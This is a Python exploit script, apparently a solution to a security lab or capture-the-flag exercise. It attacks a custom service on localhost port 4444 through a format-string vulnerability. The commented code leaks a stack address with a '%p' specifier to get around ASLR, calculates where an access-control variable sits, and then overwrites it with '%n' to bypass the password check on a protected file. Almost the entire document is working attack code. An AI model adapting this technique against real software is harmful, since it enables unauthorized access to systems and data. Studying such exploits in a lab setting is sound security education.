import socket
import time

# Telnet server details
host = 'localhost'
port = 4444

# Relative positions on the stack from the stack dump (will be the same regardless of ASLR)
reference_variable_pos = 0x3150
access_variable_pos = 0x192c

# Establish a connection
with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.connect((host, port))

    # Function to receive data until a certain prompt is found
    def recv_until_prompt(prompt):
        data = b''
        while not data.endswith(prompt):
            data += s.recv(1024)
        return data
    
    # 1. Navigate to the directory

    recv_until_prompt(b'$ ')
    s.sendall(b'sail test\n')
    recv_until_prompt(b'$ ')

    # 2. Set identity and loot to get the address of the access variable

    s.sendall(b'identity\n')
    recv_until_prompt(b': ')

    # Recall that the address space is randomized for each run of the program due to ASLR, but relative positions are the same
    # The stack dump shows that the variable at %1575$ stores the address to a nearby position on the stack
    # We can see that this address is at +0x3150 from the stack pointer $sp
    # We also see that the address storing the access variable is at +0x192c
    # We can use this information to calculate the address of the access variable
    # To ensure the string is 64 bytes long, we can pad it with 'a's
    # We also wrap the pointer in = to make it easier to extract from the response
    new_identity = b'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa=%1575$p='
    s.sendall(new_identity + b'\n')
    recv_until_prompt(b'$ ')

    # Send command to loot a.private
    s.sendall(b'loot a.private\n')
    recv_until_prompt(b': ')
    s.sendall(b'USERDATA\n')     # Send empty password, as we don't have the address yet
    response = recv_until_prompt(b'$ ')
    # Take text between = in the response, this is the address to reference_variable
    response = response.decode()
    reference_variable_address = response.split('=')[1].strip()

    # Calculate the address of the user data using relative positions in hex
    reference_variable_address = int(reference_variable_address, 16)
    access_variable_address = reference_variable_address - reference_variable_pos + access_variable_pos
    print(f"Access variable address: {hex(access_variable_address)}")

    # 3. Set identity and loot to write a truthy value to the access variable
    
    s.sendall(b'identity\n')
    recv_until_prompt(b': ')

    # We will this time input the address of the access variable when prompted for a password during the loot command
    # From the stack dump we can deduce that input at this prompt is stored at %54$
    # Now that we know the address of the access variable will be stored at %54$ we can use %n
    # %54$n will take the count of the characters in front of it and write this value to the address stored at %54$
    new_identity = b'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa%54$n'
    s.sendall(new_identity + b'\n')
    recv_until_prompt(b'$ ')

    # Send command to loot a.private
    s.sendall(b'loot a.private\n')
    recv_until_prompt(b': ')
    # Send the raw byte representation of the access variable address
    s.sendall(access_variable_address.to_bytes(8, 'little') + b'\n')
    response = recv_until_prompt(b'$ ')
    # print and terminate the session
    print(response.decode())
    s.sendall(b'exit\n')
